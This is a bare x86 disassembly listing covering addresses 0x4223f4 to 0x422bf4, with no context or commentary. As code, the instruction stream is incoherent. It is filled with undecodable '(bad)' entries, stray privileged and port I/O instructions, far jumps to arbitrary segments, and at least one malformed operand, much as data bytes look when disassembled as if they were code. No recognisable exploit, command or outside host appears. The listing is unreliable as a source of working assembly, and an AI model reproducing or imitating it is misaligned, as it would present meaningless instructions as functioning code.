  4223f4:	add    al,0xad
  4223f6:	sbb    dh,dl
  4223f8:	and    ah,BYTE PTR [esp]
  4223fb:	push   ss
  4223fc:	sub    bh,BYTE PTR [ebx+0x7505600]
  422402:	cld    
  422403:	sub    BYTE PTR [esp+edx*8-0x656c0be9],dl
  42240a:	dec    esp
  42240b:	test   BYTE PTR [eax+0x1a6111ed],dh
  422411:	cli    
  422412:	pop    esi
  422413:	dec    edx
  422414:	cmc    
  422415:	add    DWORD PTR [esi+0x63],ecx
  422418:	jge    0x422487
  42241a:	dec    esi
  42241b:	ds cdq 
  42241d:	rcl    DWORD PTR [ecx+ebx*4+0x57],cl
  422421:	xchg   edi,eax
  422422:	pushf  
  422423:	jp     0x42247c
  422425:	popf   
  422426:	or     edi,edx
  422428:	mov    ch,0x1d
  42242a:	mov    edx,0xfc5dd93f
  42242f:	(bad)  
  422431:	adc    eax,0xbde54502
  422436:	and    bl,BYTE PTR [ecx+0x1c12cc49]
  42243c:	mov    ds:0x363f6b93,al
  422441:	xor    BYTE PTR [edx],0x58
  422444:	nop
  422445:	pushf  
  422446:	push   ds
  422447:	adc    bl,cl
  422449:	pop    esi
  42244a:	pop    ds
  42244b:	sbb    ebx,DWORD PTR [esi]
  42244d:	xchg   ebp,eax
  42244e:	and    edx,DWORD PTR [ecx]
  422450:	xchg   ebx,eax
  422451:	mov    ebp,0xe7fee8f1
  422456:	test   eax,0xae25e044
  42245b:	iret   
  42245c:	xchg   ecx,eax
  42245d:	add    BYTE PTR [ecx-0x7340f970],dl
  422463:	xor    al,0xb5
  422465:	xor    BYTE PTR [ebx],ah
  422467:	test   bl,cl
  422469:	test   al,cl
  42246b:	dec    esp
  42246c:	xor    edx,DWORD PTR [edi]
  42246e:	fidiv  WORD PTR [edi]
  422470:	sub    BYTE PTR [edi-0x5753849],ah
  422476:	mov    ah,0xc5
  422478:	retf   0x8ac0
  42247b:	enter  0xbd80,0x7d
  42247f:	mov    cs:0x25937719,eax
  422485:	fisubr DWORD PTR [edi+0x75]
  422488:	xor    BYTE PTR [esi-0x50b2baee],0x53
  42248f:	fstp   TBYTE PTR [edi+0x7948b559]
  422495:	pusha  
  422496:	mov    al,0xd4
  422498:	mov    bh,0x50
  42249a:	arpl   WORD PTR [esi],si
  42249c:	pop    ss
  42249d:	cmp    dh,BYTE PTR ds:0x6f636f01
  4224a3:	xchg   ebp,eax
  4224a4:	push   eax
  4224a5:	add    DWORD PTR [edx-0x17],0x6
  4224a9:	pop    ds
  4224aa:	sbb    edx,ebx
  4224ac:	dec    esp
  4224ad:	out    dx,eax
  4224ae:	inc    DWORD PTR [ebp-0x70239ed4]
  4224b4:	lods   al,BYTE PTR ds:[esi]
  4224b5:	mov    eax,DWORD PTR [edx]
  4224b7:	lods   al,BYTE PTR ds:[esi]
  4224b8:	(bad)  
  4224b9:	arpl   WORD PTR [di],si
  4224bc:	pusha  
  4224bd:	dec    ebx
  4224be:	add    al,0x66
  4224c0:	fcmovu st,st(2)
  4224c2:	es push edx
  4224c4:	xchg   esp,eax
  4224c5:	jns    0x4224f6
  4224c7:	inc    esi
  4224c8:	fisttp QWORD PTR [ecx-0x6587f602]
  4224ce:	pop    ebx
  4224cf:	in     al,dx
  4224d0:	shr    DWORD PTR [esi-0xa],cl
  4224d3:	rcr    ah,0x77
  4224d6:	inc    edx
  4224d7:	xchg   ebp,eax
  4224d8:	int3   
  4224d9:	push   edx
  4224da:	cmp    al,0xed
  4224dc:	loop   0x42247e
  4224de:	push   es
  4224df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224e0:	and    ecx,DWORD PTR [ebx+eiz*8-0x2c3bf580]
  4224e7:	je     0x4224d2
  4224e9:	popf   
  4224ea:	mov    dl,0xdb
  4224ec:	xchg   esp,eax
  4224ed:	in     al,0xfa
  4224ef:	push   ecx
  4224f0:	jmp    0x5675:0xd1cb68f
  4224f7:	push   ecx
  4224f8:	daa    
  4224f9:	bound  edx,QWORD PTR [edx]
  4224fb:	enter  0x48c3,0x26
  4224ff:	test   eax,0xbb946e3b
  422504:	jmp    0x75044cf5
  422509:	dec    edx
  42250a:	cmp    DWORD PTR [ecx],edx
  42250c:	add    ebx,DWORD PTR [eax+0x3b25e664]
  422512:	add    eax,0x288799b5
  422517:	fwait
  422518:	je     0x4224a4
  42251a:	cwde   
  42251b:	mov    ebp,0x60d8536b
  422520:	adc    bh,dl
  422522:	ins    BYTE PTR es:[edi],dx
  422523:	sub    ch,al
  422525:	(bad)  
  422526:	stos   DWORD PTR es:[edi],eax
  422527:	cwde   
  422528:	in     eax,0xf9
  42252a:	fcom   QWORD PTR [ebp+0x52]
  42252d:	inc    ebp
  42252e:	mov    WORD PTR [ebx-0x36],?
  422531:	pop    edi
  422532:	shl    BYTE PTR ds:0xfc4fbdfe,cl
  422538:	jecxz  0x422547
  42253a:	fnsave [ecx]
  42253c:	ds sahf 
  42253e:	pop    es
  42253f:	xor    eax,0xd207bcb9
  422544:	and    al,0x67
  422546:	gs push ss
  422548:	mov    eax,ds:0xf0b593de
  42254d:	cmc    
  42254e:	(bad)  
  42254f:	mov    bl,0x1b
  422551:	sub    BYTE PTR [eax+0x4a],bl
  422554:	cmp    DWORD PTR [edi-0xd541172],edx
  42255a:	add    BYTE PTR [edi-0x465e7a5c],ch
  422560:	push   esp
  422561:	leave  
  422562:	in     al,0x17
  422564:	(bad)  
  422565:	pop    ss
  422566:	ror    esp,cl
  422568:	push   edi
  422569:	ins    BYTE PTR es:[edi],dx
  42256a:	sbb    al,0x6
  42256c:	jge    0x4225eb
  42256e:	aam    0x24
  422570:	xchg   DWORD PTR [edx],ebp
  422572:	xor    BYTE PTR [esi+0x5a92ad85],dl
  422578:	imul   ebx,DWORD PTR [edx],0x20
  42257b:	inc    edx
  42257c:	cmc    
  42257d:	add    eax,0x1198180c
  422582:	sar    dl,0xaf
  422585:	imul   ecx,DWORD PTR [esi-0x5e5e6e83],0x85cbb82d
  42258f:	retf   0x58ce
  422592:	loopne 0x422564
  422594:	dec    esp
  422595:	pusha  
  422596:	arpl   sp,cx
  422598:	mov    al,ds:0xcab35e84
  42259d:	retf   
  42259e:	imul   ebx,DWORD PTR [edx],0x5305117b
  4225a4:	loop   0x42254e
  4225a6:	into   
  4225a7:	sub    al,0x26
  4225a9:	ja     0x4225d0
  4225ab:	mov    BYTE PTR [edx],bl
  4225ad:	dec    esi
  4225ae:	aad    0x5b
  4225b0:	cmp    edx,DWORD PTR [eax]
  4225b2:	loopne 0x42257a
  4225b4:	into   
  4225b5:	daa    
  4225b6:	and    DWORD PTR [ecx+0xd5f9cb5],edi
  4225bc:	fdiv   DWORD PTR [edx+0x1f]
  4225bf:	xor    eax,0xdcb092d5
  4225c4:	(bad)  
  4225c5:	cwde   
  4225c6:	call   0xbbea:0x216f924e
  4225cd:	aam    0x52
  4225cf:	mov    al,ds:0x8feec882
  4225d4:	leave  
  4225d5:	jb     0x42258e
  4225d7:	cs push esp
  4225d9:	sub    BYTE PTR [edx-0x60965c69],dl
  4225df:	sbb    dh,BYTE PTR ds:0x79ee54a1
  4225e5:	js     0x42258d
  4225e7:	mov    eax,0x5d7d88a3
  4225ec:	cwde   
  4225ed:	inc    edi
  4225ee:	pop    ecx
  4225ef:	cli    
  4225f0:	adc    DWORD PTR [edi],esp
  4225f2:	outs   dx,DWORD PTR gs:[esi]
  4225f4:	call   0xa615dac3
  4225f9:	xor    al,0x44
  4225fb:	cmp    ebx,DWORD PTR ss:[esi]
  4225fe:	dec    eax
  4225ff:	data16 fdivr QWORD PTR [ebx]
  422602:	jmp    0x4225d2
  422604:	imul   edi
  422606:	and    al,0x46
  422608:	mov    dl,0xb1
  42260a:	in     eax,dx
  42260b:	xchg   ecx,eax
  42260c:	inc    ecx
  42260d:	pop    edi
  42260e:	cmp    esi,DWORD PTR [ebp+0x2c236449]
  422614:	enter  0x8fd5,0xca
  422618:	xchg   edi,eax
  422619:	inc    ebp
  42261a:	add    dl,dl
  42261c:	popa   
  42261d:	pop    ebp
  42261e:	bound  edx,QWORD PTR [esi+0xc09f9c5]
  422624:	push   ebx
  422625:	dec    eax
  422626:	shl    BYTE PTR [ebx+eax*2],1
  422629:	push   ecx
  42262a:	leave  
  42262b:	call   0xd503ec56
  422630:	xchg   ebp,eax
  422631:	or     DWORD PTR [ebx],0xccadd4d4
  422637:	xor    DWORD PTR [eax+0x18fe2ff],esi
  42263d:	push   ecx
  42263e:	xor    BYTE PTR [esp+ebp*4+0xb],bl
  422642:	test   eax,0xc2cc3579
  422647:	dec    ecx
  422648:	inc    ebx
  422649:	jmp    0xccf3200c
  42264e:	cdq    
  42264f:	popa   
  422650:	pop    esi
  422651:	pop    edi
  422652:	mov    ebx,0xf8ab301a
  422657:	mov    dl,0x2a
  422659:	jae    0x42266a
  42265b:	ror    BYTE PTR [eax+0x409abc8c],cl
  422661:	push   esp
  422662:	jbe    0x42265c
  422664:	loopne 0x422678
  422666:	rol    DWORD PTR [edi+0x2f],1
  422669:	out    0x93,eax
  42266b:	add    dh,BYTE PTR [edi+0x2d6c1cce]
  422671:	pop    ecx
  422672:	xor    DWORD PTR [esi-0x14],ecx
  422675:	pushf  
  422676:	jne    0x4226b3
  422678:	and    eax,0x6bf819f4
  42267d:	out    0x56,al
  42267f:	dec    ebx
  422680:	xor    cl,dl
  422682:	xor    DWORD PTR [edi],ebp
  422684:	sbb    DWORD PTR [edi-0x4a],ecx
  422687:	icebp  
  422688:	and    DWORD PTR [ecx-0x6e612b78],0x59
  42268f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422690:	popf   
  422691:	bound  ebp,QWORD PTR [ecx]
  422693:	push   ss
  422694:	sub    esi,DWORD PTR [edi+0x3b]
  422697:	jbe    0x42268f
  422699:	lods   eax,DWORD PTR ds:[esi]
  42269a:	mov    ds:0x6eaf4f64,al
  42269f:	mov    dh,0x0
  4226a1:	push   ebx
  4226a2:	jl     0x422648
  4226a4:	xchg   ebx,eax
  4226a5:	lea    eax,[ebx+0x49]
  4226a8:	rcr    al,1
  4226aa:	cmp    DWORD PTR [ebp+0x2c7616c],0x5f
  4226b1:	inc    edx
  4226b2:	push   eax
  4226b3:	mov    ds:0x809a313c,al
  4226b8:	das    
  4226b9:	dec    ebx
  4226ba:	int3   
  4226bb:	mov    eax,0xb402af67
  4226c0:	push   ds
  4226c1:	out    dx,eax
  4226c2:	cli    
  4226c3:	jbe    0x422670
  4226c5:	mov    cl,0x92
  4226c7:	call   0xbc19:0xbf9c217a
  4226ce:	mov    ecx,0x3162a151
  4226d3:	add    BYTE PTR [eax+0x1327863e],ah
  4226d9:	dec    edi
  4226da:	(bad)  
  4226db:	xor    eax,0xbf6baf0b
  4226e0:	mov    eax,0xf51c1939
  4226e5:	cmpps  xmm4,xmm1,0xa3
  4226e9:	pusha  
  4226ea:	xor    DWORD PTR [ecx-0x77],edi
  4226ed:	call   0x7adc0415
  4226f2:	or     DWORD PTR [eax+0x3dac9cf4],ebp
  4226f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226f9:	sbb    eax,0xf5a9631e
  4226fe:	nop
  4226ff:	fdivr  DWORD PTR [ebx+0x25]
  422702:	inc    edx
  422703:	jecxz  0x42277e
  422705:	addr16 inc edx
  422707:	xchg   esp,eax
  422708:	outs   dx,BYTE PTR ds:[esi]
  422709:	pop    esp
  42270a:	sbb    ch,dl
  42270c:	cdq    
  42270d:	mov    al,ds:0x512da5
  422712:	arpl   WORD PTR [eax+eiz*2+0x59],sp
  422716:	xchg   edi,eax
  422717:	fdiv   QWORD PTR [ebx-0x12767081]
  42271d:	shl    DWORD PTR [edx+0x66b9b20d],1
  422723:	inc    ebx
  422724:	jne    0x422702
  422726:	xor    eax,0x893a272c
  42272b:	fadd   QWORD PTR [ecx-0x67]
  42272f:	loope  0x422765
  422731:	jo     0x422766
  422733:	int    0xd2
  422735:	jg     0x422736
  422737:	xchg   esi,eax
  422738:	lods   eax,DWORD PTR ds:[esi]
  422739:	push   edi
  42273a:	cld    
  42273b:	(bad)  
  42273c:	in     eax,dx
  42273d:	adc    BYTE PTR [edx],ah
  42273f:	mov    al,ds:0xb97d8c90
  422744:	adc    ecx,DWORD PTR [ebp-0x68]
  422747:	xor    eax,0x51183503
  42274c:	and    BYTE PTR [ecx],dl
  42274e:	int    0xae
  422750:	adc    eax,ebx
  422752:	sahf   
  422753:	add    esp,edi
  422755:	and    al,0x43
  422757:	or     ebp,DWORD PTR [ecx+0x4559fe22]
  42275d:	adc    edx,edi
  42275f:	push   esp
  422760:	and    eax,0x5e1f5c6
  422765:	ret    0xa925
  422768:	dec    ebx
  422769:	daa    
  42276a:	mov    al,0xc6
  42276c:	cld    
  42276d:	mov    ebx,0x6c45845c
  422772:	(bad)  
  422774:	jb     0x42273f
  422776:	push   ebx
  422777:	inc    edx
  422778:	adc    ebx,DWORD PTR [ecx+0x68]
  42277b:	jns    0x4227df
  42277d:	ds (bad) 
  42277f:	mov    gs,WORD PTR ds:0x998b80df
  422785:	imul   esp,DWORD PTR [ebx+0x3ef27695],0xd07809a4
  42278f:	mov    ebp,0x25b71d19
  422794:	stos   BYTE PTR es:[edi],al
  422795:	or     dl,ah
  422797:	xor    cl,ah
  422799:	iret   
  42279a:	addr16 dec esi
  42279c:	call   0x732b984b
  4227a1:	sub    ecx,edi
  4227a3:	push   cs
  4227a4:	push   es
  4227a5:	les    ebp,FWORD PTR [ecx+0x59]
  4227a8:	in     eax,dx
  4227a9:	sub    ebx,edi
  4227ab:	sbb    bl,BYTE PTR [esi-0x612ee40e]
  4227b1:	scas   al,BYTE PTR es:[edi]
  4227b2:	jle    0x4227ea
  4227b4:	icebp  
  4227b5:	mov    DWORD PTR [esi],esi
  4227b7:	aam    0x67
  4227b9:	add    eax,esp
  4227bb:	xchg   edi,eax
  4227bc:	enter  0xa1f0,0xc3
  4227c0:	ja     0x4227fc
  4227c2:	sub    edx,DWORD PTR [edi+edx*8]
  4227c5:	mul    DWORD PTR [edx]
  4227c7:	jmp    0xb59b601a
  4227cc:	jge    0x422782
  4227ce:	inc    ebx
  4227cf:	add    BYTE PTR [esp+esi*1-0x41],bh
  4227d3:	into   
  4227d4:	jg     0x422795
  4227d6:	int    0x51
  4227d8:	xchg   esp,eax
  4227d9:	push   0x5468a043
  4227de:	adc    eax,0xac7b4221
  4227e3:	rol    BYTE PTR [ebx-0x362a8381],1
  4227e9:	and    DWORD PTR [edi-0x4624fb0e],esp
  4227ef:	bound  esp,QWORD PTR [esi]
  4227f1:	or     ch,BYTE PTR [esi-0x23]
  4227f4:	xchg   ecx,eax
  4227f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227f6:	std    
  4227f7:	retf   0x65d9
  4227fa:	mov    eax,ds:0x1b320402
  4227ff:	mov    dl,0x5d
  422801:	mov    dl,0x46
  422803:	sbb    al,0x80
  422805:	cwde   
  422806:	aad    0xc0
  422808:	pop    edi
  422809:	dec    edx
  42280a:	xor    DWORD PTR fs:[edi+0x7c],esi
  42280e:	sub    eax,0xb133db91
  422813:	test   al,0xeb
  422815:	push   es
  422816:	ret    0xcd7d
  422819:	pusha  
  42281a:	(bad)  
  42281b:	sbb    al,0xd0
  42281d:	push   ds
  42281e:	jge    0x4227a4
  422820:	iret   
  422821:	pop    ecx
  422822:	call   0xd75b8e79
  422827:	mov    bh,0xcf
  422829:	(bad)  
  42282b:	push   es
  42282c:	mov    ebp,DWORD PTR [esi]
  42282e:	xor    al,0xcb
  422830:	xor    ecx,DWORD PTR [edx+0x19]
  422833:	dec    ebp
  422834:	inc    esp
  422835:	out    0xd0,al
  422837:	out    0x81,al
  422839:	push   ss
  42283a:	mov    ecx,0x678cdbfb
  42283f:	mov    dh,0x58
  422841:	xor    eax,0x2271cdc0
  422846:	pop    eax
  422847:	mov    al,0xde
  422849:	mov    ebx,0x1b5a9b8
  42284e:	push   esi
  42284f:	popf   
  422850:	inc    edx
  422851:	dec    edx
  422852:	push   edx
  422853:	push   ds
  422854:	repnz adc dl,BYTE PTR [esi+0x4f]
  422858:	enter  0x1fe3,0x85
  42285c:	xchg   ch,dh
  42285e:	add    cl,BYTE PTR ds:0x7d8dce2d
  422864:	xchg   ebp,eax
  422865:	xchg   ecx,eax
  422866:	into   
  422867:	outs   dx,DWORD PTR ds:[esi]
  422868:	inc    eax
  422869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42286a:	jle    0x422842
  42286c:	not    BYTE PTR [edx+0x73]
  42286f:	idiv   DWORD PTR [ebx+0x23]
  422872:	push   eax
  422873:	mov    al,ds:0x8c80fcbd
  422878:	or     al,0x34
  42287a:	mov    eax,ds:0xe9b734a
  42287f:	xchg   esi,eax
  422880:	loope  0x422877
  422882:	xor    eax,0xd1f1b4a7
  422887:	ins    BYTE PTR es:[edi],dx
  422888:	adc    al,0xcc
  42288a:	ss mov esi,0x92da4f97
  422890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422891:	dec    edx
  422892:	dec    ebx
  422893:	rol    DWORD PTR [edx+edi*8+0x1005346],cl
  42289a:	repz sub bl,0xfd
  42289e:	mov    ebp,0xfc1e6288
  4228a3:	fsubr  DWORD PTR [edi-0x4]
  4228a6:	xchg   edx,eax
  4228a7:	dec    esi
  4228a8:	dec    esp
  4228a9:	mov    WORD PTR [ecx+0x5c],fs
  4228ac:	aaa    
  4228ad:	sar    DWORD PTR [ebx+eiz*4],cl
  4228b0:	pop    ebx
  4228b2:	test   al,0xd0
  4228b4:	sub    DWORD PTR [edx+0x6],esp
  4228b7:	std    
  4228b8:	push   edi
  4228b9:	fwait
  4228ba:	or     eax,0xc130eb20
  4228bf:	jl     0x42286d
  4228c1:	pop    eax
  4228c2:	dec    eax
  4228c3:	pop    esi
  4228c4:	add    al,bl
  4228c6:	jbe    0x42292b
  4228c8:	int    0x7
  4228ca:	push   es
  4228cb:	int3   
  4228cc:	jg     0x422855
  4228ce:	and    edi,DWORD PTR [ecx-0x7a]
  4228d1:	pushf  
  4228d2:	fiadd  WORD PTR [eax]
  4228d4:	mov    al,ds:0xf635512b
  4228d9:	and    esi,DWORD PTR [eax-0x5d18a098]
  4228df:	push   edi
  4228e0:	out    0x47,al
  4228e2:	dec    ebp
  4228e3:	(bad)  
  4228e5:	adc    edx,edi
  4228e7:	icebp  
  4228e8:	or     ebp,ebx
  4228ea:	jmp    0x4228f4
  4228ec:	dec    esp
  4228ed:	mov    dl,BYTE PTR [edx]
  4228ef:	mov    DWORD PTR [edx],ecx
  4228f1:	add    eax,esp
  4228f3:	repz xchg ebx,eax
  4228f5:	icebp  
  4228f6:	ins    DWORD PTR es:[edi],dx
  4228f7:	jb     0x42294b
  4228f9:	dec    eax
  4228fa:	xchg   DWORD PTR [edx-0x7e],esp
  4228fd:	gs xor eax,0x8a9d0219
  422903:	jecxz  0x42291f
  422905:	fsubr  st(6),st
  422907:	test   DWORD PTR [ebx],ecx
  422909:	sti    
  42290a:	mov    ch,0x94
  42290c:	adc    eax,0xa11ca2a6
  422911:	jnp    0x422969
  422913:	and    al,BYTE PTR [edx+ebx*8+0x2799767c]
  42291a:	add    dl,BYTE PTR [edx]
  42291c:	popa   
  42291d:	sar    DWORD PTR [edx-0x5ec03dde],cl
  422923:	call   0x51c5a651
  422928:	aaa    
  422929:	imul   ebp,DWORD PTR [ebx-0x3e],0xffffffd1
  42292d:	loopne 0x422947
  42292f:	es push ebp
  422931:	loopne 0x42298a
  422933:	or     BYTE PTR [ebx+eiz*8],0xf4
  422937:	adc    esi,DWORD PTR [ebp-0x14b94109]
  42293d:	mov    al,ss:0xa648bdd6
  422943:	aas    
  422944:	mov    esi,0xaf85e25d
  422949:	xchg   BYTE PTR [edi],cl
  42294b:	push   ebx
  42294c:	or     DWORD PTR [edx-0x4ccbfa0a],ebx
  422952:	mov    edi,0x949ef51e
  422957:	inc    edx
  422958:	(bad)  
  422959:	mov    eax,0xa1358cb
  42295e:	jne    0x422932
  422960:	hlt    
  422961:	xor    eax,0x217b29e9
  422966:	or     al,0xcb
  422968:	xchg   esi,eax
  422969:	mov    ecx,0x6efaa364
  42296e:	gs in  al,0x8a
  422971:	dec    ebx
  422972:	jmp    0x42290c
  422974:	fcom   DWORD PTR [edi]
  422976:	scas   eax,DWORD PTR es:[edi]
  422977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422978:	dec    esi
  422979:	pushf  
  42297a:	add    BYTE PTR [esp+ecx*2-0xd67e234],0xa9
  422982:	clc    
  422983:	inc    ebp
  422984:	fbstp  TBYTE PTR [edx+edi*4-0x7a20f19f]
  42298b:	out    dx,al
  42298c:	lds    edi,FWORD PTR [eiz*4-0x728838bc]
  422993:	(bad)  
  422994:	outs   dx,DWORD PTR ds:[esi]
  422995:	sub    DWORD PTR [eax+0x55],edx
  422998:	test   eax,0xfa17398
  42299d:	cmp    al,0xb9
  42299f:	inc    ebx
  4229a0:	sbb    al,bl
  4229a2:	mov    edx,0x3ececf55
  4229a7:	mov    cl,0xc3
  4229a9:	shl    ch,cl
  4229ab:	ds mov dh,ah
  4229ae:	jno    0x4229c2
  4229b0:	(bad)  
  4229b1:	frstor [edi]
  4229b3:	test   BYTE PTR [edx+eax*1],ah
  4229b6:	mov    ds:0x2f55efc4,al
  4229bb:	in     eax,0x6e
  4229bd:	lock add edx,DWORD PTR [edi-0x39f113ec]
  4229c4:	and    BYTE PTR [eax-0x25],0xf6
  4229c8:	call   0xff29:0xd74b586c
  4229cf:	outs   dx,BYTE PTR ds:[esi]
  4229d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229d1:	retf   0xdf9a
  4229d4:	push   edi
  4229d5:	(bad)  
  4229d6:	out    dx,eax
  4229d7:	xor    edi,DWORD PTR [eax+eiz*8-0x24]
  4229db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229dc:	or     eax,0x92ffb327
  4229e1:	fistp  QWORD PTR [edi-0x30]
  4229e4:	pop    ebp
  4229e5:	cmc    
  4229e6:	(bad)  
  4229e7:	cmp    bl,dl
  4229e9:	mov    edx,DWORD PTR [esi-0x37]
  4229ec:	push   cs
  4229ed:	mov    al,ds:0xb81bd24
  4229f2:	push   esi
  4229f3:	inc    ebp
  4229f4:	mov    BYTE PTR [ecx-0x37],ch
  4229f7:	clc    
  4229f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229f9:	cmp    eax,0xa3220305
  4229fe:	imul   edx,DWORD PTR [edi],0x4d7620c2
  422a04:	int3   
  422a05:	packssdw mm5,QWORD PTR [ecx+0x67]
  422a09:	mov    DWORD PTR [esi+edx*4],0x433875a5
  422a10:	sbb    bl,0x65
  422a13:	jmp    0x3b3f:0x56fd4266
  422a1a:	(bad)  
  422a1c:	sar    cl,1
  422a1e:	mov    ch,0x65
  422a20:	fs fs jnp 0x422a2d
  422a24:	daa    
  422a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a26:	pop    edi
  422a27:	jno    0x4229f7
  422a29:	fcom   st(1)
  422a2b:	iret   
  422a2c:	pop    eax
  422a2d:	add    eax,0xd812ecf7
  422a32:	test   eax,0xb60381cb
  422a37:	pop    eax
  422a38:	into   
  422a39:	lods   eax,DWORD PTR ds:[esi]
  422a3a:	(bad)  [esi]
  422a3c:	into   
  422a3d:	add    DWORD PTR [edx+ecx*8],0x5c
  422a41:	in     al,0x45
  422a43:	jle    0x422a39
  422a45:	(bad)  
  422a46:	pop    edx
  422a47:	rol    bh,1
  422a49:	sbb    bh,bh
  422a4b:	scas   al,BYTE PTR es:[edi]
  422a4c:	xor    edi,ebx
  422a4e:	cmp    eax,0xbc3bb8df
  422a53:	cld    
  422a54:	test   eax,0x6851f715
  422a59:	mov    esp,0xcf760eb6
  422a5e:	shl    DWORD PTR [ebx+0xf],0x34
  422a62:	cli    
  422a63:	adc    eax,0xf66a10c8
  422a69:	mov    DWORD PTR [esi-0x9],ebx
  422a6c:	pop    edx
  422a6d:	add    eax,0x21e4c728
  422a72:	mov    BYTE PTR [edx+0x188ea945],ah
  422a78:	arpl   WORD PTR [edi+ecx*4],dx
  422a7b:	stos   DWORD PTR es:[edi],eax
  422a7c:	pop    edx
  422a7d:	push   ebx
  422a7e:	push   0x455db8c3
  422a83:	les    esp,FWORD PTR [ebp+0x20dc1176]
  422a89:	sub    dh,BYTE PTR [ecx]
  422a8b:	sbb    eax,0xa6863896
  422a90:	push   ss
  422a91:	(bad)  
  422a92:	(bad)  
  422a94:	mov    cs:0x9ee21f57,al
  422a9a:	repnz loop 0x422a8e
  422a9d:	mov    al,ds:0xb7de6f12
  422aa2:	mov    ebp,0x8607a18b
  422aa7:	out    dx,eax
  422aa8:	int3   
  422aa9:	(bad)  
  422aaa:	pop    esi
  422aab:	sub    ebx,DWORD PTR [ecx+eiz*4]
  422aae:	sbb    BYTE PTR [eax+0x7d4a1f6b],bh
  422ab4:	cwde   
  422ab5:	mov    esp,0xb396545e
  422aba:	pop    edx
  422abb:	mov    bh,0x61
  422abd:	mov    dl,0x93
  422abf:	dec    esp
  422ac0:	inc    edx
  422ac1:	jae    0x422aad
  422ac3:	cld    
  422ac4:	and    ebp,0x475aa0eb
  422aca:	mov    ebp,0x59c7959e
  422acf:	adc    al,0x6b
  422ad1:	add    ebp,DWORD PTR [ecx+esi*1-0x5a]
  422ad5:	push   cs
  422ad6:	sbb    dh,BYTE PTR [eax+0x68b8633]
  422adc:	sub    BYTE PTR [esi-0x6],0xd8
  422ae0:	mov    edi,0xe6c7b969
  422ae5:	test   DWORD PTR [esi],esp
  422ae7:	push   ds
  422ae8:	dec    edi
  422ae9:	mov    bh,0xaa
  422aeb:	shr    BYTE PTR [edi+0x31],0x2
  422aef:	cwde   
  422af0:	add    DWORD PTR [ecx+0x14919e1b],ebx
  422af6:	dec    eax
  422af7:	int3   
  422af8:	ss sbb al,0x95
  422afb:	inc    esi
  422afc:	in     eax,dx
  422afd:	ror    BYTE PTR [ebp+0xf],1
  422b00:	stc    
  422b01:	mov    bl,0x84
  422b03:	xchg   BYTE PTR [ebp-0x43d6438e],ch
  422b09:	scas   eax,DWORD PTR es:[edi]
  422b0a:	or     cl,dh
  422b0c:	pop    ecx
  422b0d:	sub    eax,0x11dd902f
  422b12:	daa    
  422b13:	mov    esi,0x101ac816
  422b18:	(bad)  
  422b19:	sub    eax,0x25002922
  422b1e:	cs xchg ecx,eax
  422b20:	(bad)  
  422b21:	cmp    eax,0xdf5194dc
  422b26:	gs xchg ecx,eax
  422b28:	retf   0x88bc
  422b2b:	cmp    eax,0xb6f3ea78
  422b30:	inc    edx
  422b31:	out    0x23,eax
  422b33:	inc    ebp
  422b34:	outs   dx,BYTE PTR ds:[esi]
  422b35:	enter  0x2e24,0x68
  422b39:	aaa    
  422b3a:	push   0x932a91e8
  422b3f:	(bad)  
  422b40:	fs pop edi
  422b42:	jecxz  0x422b6e
  422b44:	les    ebp,FWORD PTR ds:0xd94bde69
  422b4a:	push   ss
  422b4b:	in     eax,0xe7
  422b4d:	jbe    0x422b84
  422b4f:	(bad)  
  422b50:	jo     0x422b91
  422b52:	pop    ecx
  422b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b54:	xor    BYTE PTR [edi-0x4e0e99c6],ch
  422b5a:	or     al,0x54
  422b5c:	leave  
  422b5d:	add    DWORD PTR [ebx-0x3a292393],edx
  422b63:	aaa    
  422b64:	pxor   mm7,QWORD PTR [edi]
  422b67:	adc    ebp,edi
  422b69:	loope  0x422af4
  422b6b:	inc    esp
  422b6c:	pushf  
  422b6d:	cld    
  422b6e:	adc    dh,al
  422b70:	test   DWORD PTR [edx+esi*8+0x5],ebp
  422b74:	loopne 0x422b1e
  422b76:	xor    ebx,DWORD PTR [edi]
  422b78:	cmp    esp,DWORD PTR fs:[edi-0x4d]
  422b7c:	add    dh,BYTE PTR [edx-0x42]
  422b7f:	add    al,0xe2
  422b81:	adc    al,0xa9
  422b83:	test   al,0x4f
  422b85:	ds js  0x422bb8
  422b88:	sti    
  422b89:	jp     0x422b65
  422b8b:	push   ebp
  422b8c:	outs   dx,BYTE PTR ds:[esi]
  422b8d:	ret    
  422b8e:	loopne 0x422b7c
  422b90:	scas   al,BYTE PTR es:[edi]
  422b91:	retf   0x79f7
  422b94:	mov    al,0x45
  422b96:	mov    eax,ds:0xb2013fd3
  422b9b:	mov    BYTE PTR ds:0x525ad1f6,ch
  422ba1:	mov    dh,0xbe
  422ba3:	xor    BYTE PTR ds:0x3d7266dd,ah
  422ba9:	(bad)  
  422baa:	xor    eax,0xec4d6433
  422baf:	mov    ebp,0xfc1f860d
  422bb4:	push   ss
  422bb5:	or     eax,0x15878b10
  422bba:	xchg   esp,eax
  422bbb:	rcl    BYTE PTR [esi+0x1a],cl
  422bbe:	jnp    0x422bce
  422bc0:	mov    esi,0xe42f03b8
  422bc5:	in     al,dx
  422bc6:	in     eax,0x8
  422bc8:	sub    ebp,ebp
  422bca:	pop    edx
  422bcb:	js     0x422c21
  422bcd:	enter  0xd450,0x94
  422bd1:	out    0xf2,al
  422bd3:	adc    DWORD PTR [ebp-0x2cbd4ac0],edx
  422bd9:	(bad)  [ebp+0x2c]
  422bdc:	gs xor eax,0x2ecd1025
  422be2:	lahf   
  422be3:	sbb    esi,0xffffff80
  422be6:	ret    
  422be7:	or     esi,DWORD PTR [eax+0x16]
  422bea:	scas   al,BYTE PTR es:[edi]
  422beb:	ja     0x422c36
  422bed:	bound  esi,QWORD PTR [edi]
  422bef:	frstor [esp+eiz*8-0x7e]
  422bf3:	lods   eax,DWORD PTR ds:[esi]
  422bf4:	call   0x9fd3beb2
